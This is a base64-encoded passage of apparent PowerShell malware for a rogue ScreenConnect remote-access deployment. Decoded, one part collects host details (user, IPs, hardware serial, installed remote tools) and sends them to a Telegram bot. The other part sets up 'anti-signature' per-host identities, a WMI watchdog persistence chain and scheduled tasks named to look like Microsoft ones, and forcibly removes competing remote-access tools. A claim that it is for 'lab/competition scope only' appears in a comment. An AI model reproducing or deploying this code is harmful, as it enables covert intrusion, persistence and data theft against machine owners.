ZXQtU3ZjTGluZSAkcHJpbQ0KJGFsdExpbmUgPSBHZXQtU3ZjTGluZSAkYWx0DQokcHJpbU9rID0g
JHByaW1MaW5lIC1saWtlICdSdW5uaW5nKicNCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRh
c2tPayAtZ2UgMykgLWFuZCAkaGFzTW9uDQoNCiRlbW9qaU1hcCA9IEB7DQogICAgT0sgICAgICAg
PSBbc3RyaW5nXShbY2hhcl0weDI3MDUpDQogICAgRE9XTiAgICAgPSAoW3N0cmluZ11bY2hhcl06
OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjZBOCkpDQogICAgUkVTVE9SRUQgPSAoW3N0cmluZ11bY2hh
cl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjdFMikpDQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShb
Y2hhcl0weDI3NEMpDQogICAgRk9SQ0UgICAgPSBbc3RyaW5nXShbY2hhcl0weDI2QTEpDQogICAg
REVQTE9ZICAgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjY4MCkpDQog
ICAgSEIgICAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkp
DQp9DQoka2V5ID0gJFN0YXRlLlRvVXBwZXJJbnZhcmlhbnQoKQ0KJGVtb2ppID0gaWYgKCRlbW9q
aU1hcC5Db250YWluc0tleSgka2V5KSkgeyAkZW1vamlNYXBbJGtleV0gfSBlbHNlIHsgKFtzdHJp
bmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RjEpKSB9DQoNCiR0aXRsZSA9IHN3aXRj
aCAoJGtleSkgew0KICAgICdPSycgeyAnUHJpbWFyeSBoZWFsdGh5JyB9DQogICAgJ0RPV04nIHsg
J1ByaW1hcnkgRE9XTiAtIGhlYWxpbmcnIH0NCiAgICAnUkVTVE9SRUQnIHsgJ1ByaW1hcnkgUkVT
VE9SRUQnIH0NCiAgICAnRkFJTCcgeyAnSGVhbCBGQUlMRUQnIH0NCiAgICAnRk9SQ0UnIHsgJ0Zv
cmNlZCByZWluc3RhbGwnIH0NCiAgICAnREVQTE9ZJyB7IGlmICgkZGVwbG95T2spIHsgJ0ZJUlNU
IERFUExPWSBPSycgfSBlbHNlIHsgJ0ZJUlNUIERFUExPWSAtIENIRUNLIE5FRURFRCcgfSB9DQog
ICAgJ0hCJyB7ICdob3VybHkgZGlnZXN0JyB9DQogICAgZGVmYXVsdCB7ICJTdGF0ZTogJFN0YXRl
IiB9DQp9DQoNCiR0cmFucyA9IGlmICgkT2xkU3RhdGUpIHsgIiRPbGRTdGF0ZSAtPiAkU3RhdGUi
IH0gZWxzZSB7ICRTdGF0ZSB9DQokc2NMaXN0ID0gR2V0LVNjSW5zdGFsbHMNCiRybW1IaXRzID0g
R2V0LVJtbUhpdHMNCmlmICgkcm1tSGl0cy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kcm1tSGl0cy5B
ZGQoJy0gKG5vbmUgZGV0ZWN0ZWQpJykgfQ0KDQokcHViID0gR2V0LVB1YmxpY0lwDQokbGFuID0g
R2V0LUxvY2FsSXBzDQokbm93ID0gR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpz
cyB6enonDQokdXB0aW1lID0gJ24vYScNCnRyeSB7DQogICAgJGJvb3QgPSAoR2V0LUNpbUluc3Rh
bmNlIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuTGFzdEJvb3RVcFRpbWUNCiAgICAkdXB0aW1lID0g
J3swOmRkfWQgezA6aGh9aCB7MDptbX1tJyAtZiAoKEdldC1EYXRlKSAtICRib290KQ0KfSBjYXRj
aCB7fQ0KDQojIGNhbXBhaWduIHN0YXRlIGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3Rh
dGUgYWN0aW9uKQ0KJHN0YXRlTGluZSA9ICduL2EnDQokc3RhdGVPYmogPSAkbnVsbA0KJHN0YXRl
UGF0aDIgPSBKb2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nDQppZiAoVGVzdC1QYXRoICRz
dGF0ZVBhdGgyKSB7DQogICAgJHJhd1N0YXRlID0gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAk
c3RhdGVQYXRoMiAtUmF3KS5UcmltKCkNCiAgICB0cnkgew0KICAgICAgICAkc3RhdGVPYmogPSAk
cmF3U3RhdGUgfCBDb252ZXJ0RnJvbS1Kc29uDQogICAgICAgICRmb3JlaWduQ3N2ID0gaWYgKCRz
dGF0ZU9iai5mb3JlaWduKSB7ICgkc3RhdGVPYmouZm9yZWlnbiAtam9pbiAnLCcpIH0gZWxzZSB7
ICctJyB9DQogICAgICAgICRzdGF0ZUxpbmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9
JCgkc3RhdGVPYmouYWx0KSBmb3JlaWduPVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmou
dGFza3NPaykvJCgkc3RhdGVPYmoudGFza3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cp
IGhlYWxzPSQoJHN0YXRlT2JqLmluc3RhbGxDb3VudCkiDQogICAgfSBjYXRjaCB7ICRzdGF0ZUxp
bmUgPSAkcmF3U3RhdGUgfQ0KfQ0KDQokZGVwbG95QmxvY2sgPSAnJw0KaWYgKCRrZXkgLWVxICdE
RVBMT1knKSB7DQogICAgJHZlcmRpY3QgPSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhF
QUxUSFknIH0gZWxzZSB7ICdERVBMT1lFRCBCVVQgSU5DT01QTEVURScgfQ0KICAgICRmb3JlaWdu
ID0gQChHZXQtQ2hpbGRJdGVtIC1QYXRoICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5l
Y3QgQ2xpZW50KiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTY3JlZW5Db25uZWN0IENsaWVu
dCoiIC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICBX
aGVyZS1PYmplY3QgeyAkXy5OYW1lIC1ub3RtYXRjaCAnNWY2MDEwNTc5ODUyZTUwN3xmODYxYzgx
NDBkNDUzNDI3JyB9KQ0KICAgICRkaWFnTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0
aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgICRib290UGF0aCA9IEpvaW4tUGF0aCAkV29y
a0RpciAnYm9vdC5lcnInDQogICAgaWYgKFRlc3QtUGF0aCAkYm9vdFBhdGgpIHsNCiAgICAgICAg
JGludGVyZXN0aW5nID0gQCgNCiAgICAgICAgICAgICdtc2lfJywgJ2ZldGNoXycsICdwcmltYXJ5
XycsICdudWtlXycsICdtc2lfdG9vJywgJ21zaV9mZXRjaCcsICdtc2lfZXhpdCcsDQogICAgICAg
ICAgICAnbXNpX3VuYXZhaWxhYmxlJywgJ3NlY3VyZV8nLCAnZ29fJywgJ2V4dGVybWluYXRlXycs
ICdpZGVudGl0eV8nLA0KICAgICAgICAgICAgJ2NyZWF0ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywg
J29ycGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3RpbnN0YWxsJywgJ2FsdF8nDQogICAgICAgICkNCiAg
ICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRib290UGF0aCAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVyZS1PYmplY3Qgew0KICAgICAgICAgICAg
ICAgICRsaW5lID0gJF8NCiAgICAgICAgICAgICAgICBmb3JlYWNoICgkdCBpbiAkaW50ZXJlc3Rp
bmcpIHsgaWYgKCRsaW5lIC1saWtlICIqJHQqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAgICAg
ICAgICAgICAgJGZhbHNlDQogICAgICAgICAgICB9IHwNCiAgICAgICAgICAgIFNlbGVjdC1PYmpl
Y3QgLUxhc3QgMjYgfA0KICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xp
bmVzLkFkZCgoJy0gPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgy
MC1ceDdFXScsICc/JykpKSkgfQ0KICAgIH0NCiAgICBpZiAoJGRpYWdMaW5lcy5Db3VudCAtZXEg
MCkgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgnLSAobm8gaW5zdGFsbC9udWtlIG1hcmtlcnMgaW4g
Ym9vdC5lcnIpJykgfQ0KICAgICRkZXBsb3lCbG9jayA9IEAiDQoNCjxiPkRlcGxveSB2ZXJkaWN0
PC9iPg0KLSBSZXN1bHQ6IDxiPiQoRXNjICR2ZXJkaWN0KTwvYj4NCi0gUHJpbWFyeSBSdW5uaW5n
OiAkKGlmICgkcHJpbU9rKSB7ICdZRVMnIH0gZWxzZSB7ICdOTycgfSkNCi0gTW9uaXRvciBzY3Jp
cHQgKC53dWNhY2hlXG93bl9tb24uY21kKTogJChpZiAoJGhhc01vbikgeyAnWUVTJyB9IGVsc2Ug
eyAnTk8nIH0pDQotIEJhY2t1cCBtb24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRo
YXNFdGwpIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQ0KLSBQZXJzaXN0IHRhc2tzIE9LOiAkdGFz
a09rIC8gJCgkZXhwZWN0ZWRUYXNrcy5Db3VudCkgKGJhZC9taXNzaW5nOiAkdGFza0JhZCkNCi0g
TVNJIGNhY2hlOiAkKEVzYyAkbXNpU2l6ZSkNCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQo
JGZvcmVpZ24uQ291bnQpDQotIE5vdGU6IExhc3RSZXN1bHQgMjY3MDExID0gdGFzayBub3QgeWV0
IHJ1biAobm9ybWFsIHJpZ2h0IGFmdGVyIGNyZWF0ZSkNCg0KPGI+RGVwbG95IGxvZyBtYXJrZXJz
PC9iPg0KJCgkZGlhZ0xpbmVzIC1qb2luICJgbiIpDQoiQA0KfQ0KDQokdGV4dCA9IEAiDQokZW1v
amkgPGI+U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8L2I+DQoNCjxiPkV2ZW50PC9iPg0KLSBT
dW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkNCi0gVHJhbnNpdGlvbjogPGNvZGU+JChFc2MgJHRyYW5z
KTwvY29kZT4NCi0gV2hlbjogJChFc2MgJG5vdykNCiRkZXBsb3lCbG9jaw0KDQo8Yj5Ib3N0PC9i
Pg0KLSBDb21wdXRlcjogPGNvZGU+JChFc2MgJGVudjpDT01QVVRFUk5BTUUpPC9jb2RlPg0KLSBV
c2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4NCi0gRWxldmF0ZWQ6ICRlbGV2IHwgU1lTVEVN
OiAkaXNTeXN0ZW0NCi0gRG9tYWluL1dvcmtncm91cDogJChFc2MgJG9zLkRvbWFpbikNCg0KPGI+
TmV0d29yazwvYj4NCi0gTEFOIElQczogPGNvZGU+JChFc2MgJGxhbik8L2NvZGU+DQotIFB1Ymxp
YyBJUDogPGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+DQoNCjxiPk9TIC8gSGFyZHdhcmU8L2I+DQot
IE9TOiAkKEVzYyAkb3MuQ2FwdGlvbikNCi0gVmVyc2lvbjogJChFc2MgJG9zLlZlcnNpb24pIChi
dWlsZCAkKEVzYyAkb3MuQnVpbGQpKSAkKEVzYyAkb3MuQXJjaCkNCi0gSW5zdGFsbDogJChFc2Mg
JG9zLkluc3RhbGxEYXRlKSB8IExhc3QgYm9vdDogJChFc2MgJG9zLkxhc3RCb290KQ0KLSBVcHRp
bWU6ICQoRXNjICR1cHRpbWUpDQotIENQVTogJChFc2MgJG9zLkNQVSkNCi0gSGFyZHdhcmU6ICQo
RXNjICRvcy5NYW51ZmFjdHVyZXIpICQoRXNjICRvcy5Nb2RlbCkNCi0gU2VyaWFsOiA8Y29kZT4k
KEVzYyAkb3MuU2VyaWFsKTwvY29kZT4NCi0gUkFNOiAkKCRvcy5Ub3RhbFJBTV9HQikgR0INCi0g
RGlzayBDOiAkKCRvcy5EaXNrRnJlZV9HQikgR0IgZnJlZSAvICQoJG9zLkRpc2tTaXplX0dCKSBH
Qg0KDQo8Yj5TY3JlZW5Db25uZWN0IChhbGwpPC9iPg0KLSBQcmltYXJ5IDxjb2RlPjVmNjAxMDU3
OTg1MmU1MDc8L2NvZGU+OiAkKEVzYyAkcHJpbUxpbmUpDQotIEFsdCA8Y29kZT5mODYxYzgxNDBk
NDUzNDI3PC9jb2RlPjogJChFc2MgJGFsdExpbmUpDQokKCRzY0xpc3QgLWpvaW4gImBuIikNCg0K
PGI+T3RoZXIgUk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQ0K
DQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+DQokKCR0YXNrTGluZXMgLWpvaW4gImBu
IikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNpemUpDQotIFdvcmtE
aXI6IDxjb2RlPiQoRXNjICRXb3JrRGlyKTwvY29kZT4NCg0KPGI+Q2FtcGFpZ24gc3RhdGU8L2I+
DQotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPg0KDQo8aT5Cb3Q6IEBub2J1ZGR5cm1t
Qm90IHwgVEdfUkVQT1JUIFQ4PC9pPg0KIkANCg0KIyBjb21wYWN0IGRpZ2VzdCBtb2RlOiBvbmUg
c2hvcnQgbGluZSwgSFRNTC1mcmVlIChob3VybHkgaGVhcnRiZWF0KQ0KaWYgKCRNb2RlIC1lcSAn
Y29tcGFjdCcpIHsNCiAgICAkZm9yZWlnbk4gPSAwDQogICAgaWYgKCRzdGF0ZU9iaiAtYW5kICRz
dGF0ZU9iai5mb3JlaWduKSB7ICRmb3JlaWduTiA9IEAoJHN0YXRlT2JqLmZvcmVpZ24pLkNvdW50
IH0NCiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNoZSkgeyAnezA6TjB9S0In
IC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8gMUtCKSB9IGVsc2UgeyAn
MCcgfQ0KICAgICRwcmltU2hvcnQgPSBpZiAoJHByaW1PaykgeyAnT0snIH0gZWxzZSB7ICdET1dO
JyB9DQogICAgJGFsdFNob3J0ID0gaWYgKCRhbHRMaW5lIC1saWtlICdSdW5uaW5nKicpIHsgJ09L
JyB9IGVsc2UgeyAnLScgfQ0KICAgICR0ZXh0ID0gIiRlbW9qaSBTQ0R8JCgkZW52OkNPTVBVVEVS
TkFNRSl8cHJpbT0kcHJpbVNob3J0fGFsdD0kYWx0U2hvcnR8Zm9yZWlnbj0kZm9yZWlnbk58dGFz
a3M9JHRhc2tPay81fG1zaT0kbXNpU2hvcnR8dXA9JHVwdGltZXxiPSRCdWlsZHwkbm93Ig0KfQ0K
DQppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7DQogICAgJHJtbUhpdHMgPSBAKCgkcm1tSGl0
cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAoJy0gLi4uICh7MH0gbW9yZSknIC1mICgk
cm1tSGl0cy5Db3VudCAtIDEyKSkNCiAgICAkc2NMaXN0ID0gQCgoJHNjTGlzdCB8IFNlbGVjdC1P
YmplY3QgLUZpcnN0IDE0KSkgKyAoJy0gLi4uICh7MH0gbW9yZSknIC1mICgkc2NMaXN0LkNvdW50
IC0gMTQpKQ0KICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5nKDAsIDM4MDApICsgImBuYG48aT5U
UlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiINCn0NCg0KJGxvZyA9IEpvaW4tUGF0
aCAkV29ya0RpciAnYm9vdC5lcnInDQpmdW5jdGlvbiBTZW5kLVRnKFtzdHJpbmddJG1zZywgW3N0
cmluZ10kbW9kZSkgew0KICAgICRwYXlsb2FkID0gQHsNCiAgICAgICAgY2hhdF9pZCAgICAgICAg
ICAgICAgICAgID0gJGNmZy5DSEFUX0lEDQogICAgICAgIHRleHQgICAgICAgICAgICAgICAgICAg
ICA9ICRtc2cNCiAgICAgICAgZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3ID0gJHRydWUNCiAgICB9
DQogICAgaWYgKCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21vZGUgPSAkbW9kZSB9DQogICAgJGpz
b24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyAtRGVwdGggNQ0KICAgICRi
eXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGpzb24pDQogICAg
SW52b2tlLVJlc3RNZXRob2QgLVVyaSAoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRj
ZmcuQk9UX1RPS0VOKS9zZW5kTWVzc2FnZSIpIGANCiAgICAgICAgLU1ldGhvZCBQb3N0IC1Cb2R5
ICRieXRlcyAtQ29udGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgnIHwg
T3V0LU51bGwNCn0NCg0KZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0cmluZ10kbXNnLCBbc3RyaW5n
XSRtb2RlKSB7DQogICAgJHRvU2VuZCA9ICRtc2cNCiAgICB0cnkgew0KICAgICAgICBTZW5kLVRn
IC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQ0KICAgICAgICByZXR1cm4gJHRydWUNCiAgICB9IGNh
dGNoIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5T
dWJzdHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUNCiAg
ICAgICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgIHJl
dHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KdHJ5IHsNCiAgICBpZiAoU2VuZC1U
Z1NhZmUgLW1zZyAkdGV4dCAtbW9kZSAnSFRNTCcpIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxp
dGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3JpY2gnIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlDQogICAgfSBlbHNlIHsNCiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJw0KICAg
IH0NCiAgICBpZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxp
dGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0
aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lfdGcuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUg
LUZvcm1hdCAnbycpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfSBjYXRj
aCB7DQogICAgdHJ5IHsNCiAgICAgICAgJHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgkdGV4dCwg
JzxbXj5dKz4nLCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06
Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAoJHBsYWluLkxlbmd0aCAtZ3QgMzUwMCkg
eyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1MDApICsgImBuVFJVTkNBVEVEIiB9DQog
ICAgICAgIFNlbmQtVGdTYWZlIC1tc2cgJHBsYWluIC1tb2RlICcnIHwgT3V0LU51bGwNCiAgICAg
ICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAt
RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBBZGQt
Q29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0Z19mYWlsICIgKyAkXy5FeGNlcHRp
b24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAg
QlVJTEQgMjAyNjA4MDJMNg0KIyBTaGFyZWQgbGlicmFyeTogcGVyLWhvc3QgaWRlbnRpdHkgKGFu
dGktc2lnbmF0dXJlKSwgV01JIHdhdGNoZG9nDQojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4p
LCBjYW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4NCiMgTDI6IHNhZmUgdGFz
ay1uYW1lIHBvb2xzIChwYXJlbnRzIGV4aXN0IG9uIGFsbCBXaW4xMC8xMSksIElERU5UVkVSDQoj
IHJlZ2VuZXJhdGlvbiwgLUFjdGlvbiByZXBhaXIgcmVjcmVhdGVzIGRlbGV0ZWQgU0Mgc2Vydmlj
ZXMgdmlhDQojIG1zaWV4ZWMgL2ZhIHtHVUlEfSAobmV2ZXIgdHJpZ2dlcnMgU0MtZmFtaWx5IG1h
am9yLXVwZ3JhZGUgcmVtb3ZhbCkuDQojIEwzOiAtQWN0aW9uIGV4dGVybWluYXRlIC0gdHJ1ZSBy
ZW1vdmFsIGVuZ2luZSBmb3IgZm9yZWlnbiBTY3JlZW5Db25uZWN0DQojIChNU0kgdW5pbnN0YWxs
ICsgc3ZjL3Byb2MvZGlyIGtpbGwpIGFuZCBkaXNhbGxvd2VkIFJNTSB0b29scy4NCiMgQXV0aG9y
aXplZCBpbnRlcm5hbCBkZXBsb3ltZW50IC0gbGFiL2NvbXBldGl0aW9uIHNjb3BlIG9ubHkuDQoj
IOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkA0KW0NtZGxldEJpbmRpbmcoKV0NCnBhcmFtKA0KICAgIFtQYXJh
bWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQ0KICAgIFtWYWxpZGF0ZVNldCgnaW5pdCcsICd3YXRj
aGRvZycsICd3YXRjaGRvZy1lbnN1cmUnLCAnc3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywg
J3JlZ2lzdGVyZWQnLCAnZXh0ZXJtaW5hdGUnKV0NCiAgICBbc3RyaW5nXSRBY3Rpb24sDQogICAg
W3N0cmluZ10kV29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJc
VGVtcFwud3VjYWNoZScsDQogICAgW3N0cmluZ10kTW9uUGF0aCA9ICcnLA0KICAgIFtzdHJpbmdd
JEJ1aWxkICA9ICdPMTUnLA0KICAgIFtzdHJpbmddJEV4dHJhICA9ICcnLA0KICAgIFtzdHJpbmdd
JEZwICAgICA9ICcnDQopDQoNCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250
aW51ZScNCiRjZmdQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5jZmcnDQokSWRl
bnRWZXJzaW9uID0gMw0KDQojIExlZ2l0LWxvb2tpbmcgdGFzay1uYW1lIHBvb2xzOyBwZXItaG9z
dCBoYXNoIHBpY2tzIG9uZSBwZXIgc2xvdC4NCiMgdjI6IE9OTFkgcGFyZW50IGZvbGRlcnMgdGhh
dCBleGlzdCBvbiBldmVyeSBXaW4xMC8xMSAoV3dhblN2Yy9NZW1vcnlEaWFnbm9zdGljLw0KIyBQ
b3dlckVmZmljaWVuY3kvRGlza0RpYWdub3N0aWMgcGFyZW50cyBhcmUgYWJzZW50IG9uIHNvbWUg
bWFjaGluZXMgLT4gL0NyZWF0ZSBmYWlsZWQpLg0KJFBvb2xzID0gQHsNCiAgICBBID0gQCgnXE1p
Y3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnLCdcTWljcm9zb2Z0XFdpbmRvd3Nc
RGlhZ25vc2lzXEJWVENvbnN1bWVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdhdGhl
ck5ldHdvcmtJbmZvJywnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdCcsJ1xN
aWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyIERpYWdub3N0aWNzJywnXE1pY3Jvc29mdFxXaW5k
b3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MScsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2Vy
dmVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTUlRhc2snKQ0KICAgIEIgPSBAKCdc
TWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlcicsJ1xNaWNyb3NvZnRcV2luZG93c1xXRElcUmVz
b2x1dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEJWVENvbnN1bWVyJywn
XE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdhdGhlck5ldHdvcmtJbmZvJywnXE1pY3Jvc29m
dFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnLCdcTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBc
SXBBZGRyZXNzQ29uZmxpY3QyJywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIgRGlhZ25v
c3RpY3MnLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXFNSVGFzaycpDQogICAgQyA9IEAo
J1xNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdpbmRv
d3NcTmV0VHJhY2VcR2F0aGVyTmV0d29ya0luZm8nLCdcTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBc
SXBBZGRyZXNzQ29uZmxpY3QxJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xCVlRDb25z
dW1lcicsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyJywnXE1pY3Jvc29mdFxXaW5kb3dz
XERpYWdub3Npc1xTY2hlZHVsZWQnLCdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlciBEaWFn
bm9zdGljcycsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU1JUYXNrJykNCiAgICBEID0g
QCgnXE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MScsJ1xNaWNyb3Nv
ZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdpbmRvd3NcTmV0VHJh
Y2VcR2F0aGVyTmV0d29ya0luZm8nLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEJWVENv
bnN1bWVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdcTWljcm9zb2Z0XFdpbmRv
d3NcRGlhZ25vc2lzXFNjaGVkdWxlZCcsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyIERp
YWdub3N0aWNzJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTUlRhc2snKQ0KfQ0KJERl
ZmF1bHRzID0gW29yZGVyZWRdQHsNCiAgICBUQVNLX0EgPSAnXE1pY3Jvc29mdFxXaW5kb3dzXERp
YWdub3Npc1xTY2hlZHVsZWQnDQogICAgVEFTS19CID0gJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFc
U2VydmVyJw0KICAgIFRBU0tfQyA9ICdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRpb25I
